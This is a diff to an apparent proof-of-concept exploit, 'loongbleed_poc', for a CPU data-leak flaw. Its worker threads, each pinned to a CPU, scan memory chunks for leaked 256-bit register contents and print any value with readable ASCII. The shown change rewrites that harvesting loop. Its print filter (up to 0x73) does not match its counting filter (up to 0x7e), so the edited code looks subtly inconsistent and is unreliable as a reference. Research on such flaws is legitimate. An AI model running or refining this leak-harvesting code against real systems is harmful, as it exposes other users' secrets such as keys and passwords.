@@ -11,6 +11,7 @@
 //   loongbleed_poc.cpp
 //   ./loongbleed_poc
 
+#include <array>
 #include <assert.h>
 #include <pthread.h>
 #include <sched.h>
@@ -148,7 +149,7 @@ static void *worker(void *arg) {
 
   printf("[cpu %2d] thread started, pinning to CPU %d\n", cpu, cpu);
 
-  std::set<std::pair<uint64_t, uint64_t>> seen;
+  std::set<std::array<uint64_t, 4>> seen;
 
   while (running) {
     // Clear the area
@@ -161,87 +162,29 @@ static void *worker(void *arg) {
       uint64_t *chunk = (uint64_t *)(buf + CHUNK_SIZE * j);
 
       // Check for leaked data in the lower 128 bits
-      uint64_t lo = chunk[4];
-      uint64_t hi = chunk[5];
-      if (lo != 0) {
-        auto key = std::make_pair(0, lo);
+      std::array<uint64_t, 4> key = {chunk[4], chunk[5], chunk[6], chunk[7]};
+      if (chunk[4] != 0 || chunk[5] != 0 || chunk[6] != 0 || chunk[7] != 0) {
         if (seen.find(key) == seen.end()) {
           seen.insert(key);
 
-          // Only print if upper 4 bytes are valid ASCII
-          uint8_t *p = (uint8_t *)&lo + 4;
-          int all_ascii = 1;
-          for (int i = 0; i < 4 && all_ascii; i++)
-            if (p[i] < 0x20 || p[i] > 0x7e)
-              all_ascii = 0;
+          // Only print if >= 4 bytes are valid ASCII
+          uint8_t *p = (uint8_t *)&chunk[4] + 4;
+          int ascii_count = 0;
+          for (int i = 0; i < 28; i++)
+            if (p[i] >= 0x20 && p[i] <= 0x7e)
+              ascii_count++;
 
-          if (all_ascii) {
+          if (ascii_count >= 4) {
             pthread_mutex_lock(&lock);
-            printf("[cpu %3d] LEAK chunk=%2d  "
-                   "lower=0x%016lx_%016lx  ascii=",
-                   cpu, j, hi, lo);
-            for (int i = 0; i < 4; i++)
-              putchar(p[i]);
-            putchar('\n');
-            pthread_mutex_unlock(&lock);
-          }
-        }
-      }
-
-      if (hi != 0) {
-        auto key = std::make_pair(hi, 0);
-        if (seen.find(key) == seen.end()) {
-          seen.insert(key);
-
-          // Only print if all 8 bytes are valid ASCII
-          uint8_t *p = (uint8_t *)&hi;
-          int all_ascii = 1;
-          for (int i = 0; i < 8 && all_ascii; i++)
-            if (p[i] < 0x20 || p[i] > 0x7e)
-              all_ascii = 0;
-
-          if (all_ascii) {
-            pthread_mutex_lock(&lock);
-            printf("[cpu %3d] LEAK chunk=%2d  "
-                   "lower=0x%016lx_%016lx  ascii=",
-                   cpu, j, hi, lo);
-            for (int i = 0; i < 8; i++)
-              putchar(p[i]);
-            putchar('\n');
-            pthread_mutex_unlock(&lock);
-          }
-        }
-      }
-
-      // Check for leaked data in the upper 128 bits of each chunk
-      uint64_t leaked_lo = chunk[6];
-      uint64_t leaked_hi = chunk[7];
-
-      if (leaked_lo != 0 && leaked_hi != 0) {
-        auto key = std::make_pair(leaked_lo, leaked_hi);
-        if (seen.find(key) == seen.end()) {
-          seen.insert(key);
-
-          // Only print if all 16 bytes are valid ASCII
-          uint8_t *p = (uint8_t *)&leaked_lo;
-          uint8_t *q = (uint8_t *)&leaked_hi;
-          int all_ascii = 1;
-          for (int i = 0; i < 8 && all_ascii; i++)
-            if (p[i] < 0x20 || p[i] > 0x7e)
-              all_ascii = 0;
-          for (int i = 0; i < 8 && all_ascii; i++)
-            if (q[i] < 0x20 || q[i] > 0x7e)
-              all_ascii = 0;
-
-          if (all_ascii) {
-            pthread_mutex_lock(&lock);
-            printf("[cpu %3d] LEAK chunk=%2d  "
-                   "upper=0x%016lx_%016lx  ascii=",
-                   cpu, j, leaked_hi, leaked_lo);
-            for (int i = 0; i < 8; i++)
-              putchar(p[i]);
-            for (int i = 0; i < 8; i++)
-              putchar(q[i]);
+            printf("[cpu %3d] LEAK chunk=%2d "
+                   "data=0x%016lx_%016lx_%016lx_%016lx ascii=",
+                   cpu, j, chunk[7], chunk[6], chunk[5], chunk[4]);
+            for (int i = 0; i < 28; i++) {
+              if (p[i] >= 0x20 && p[i] <= 0x73)
+                putchar(p[i]);
+              else
+                putchar('.');
+            }
             putchar('\n');
             pthread_mutex_unlock(&lock);
           }
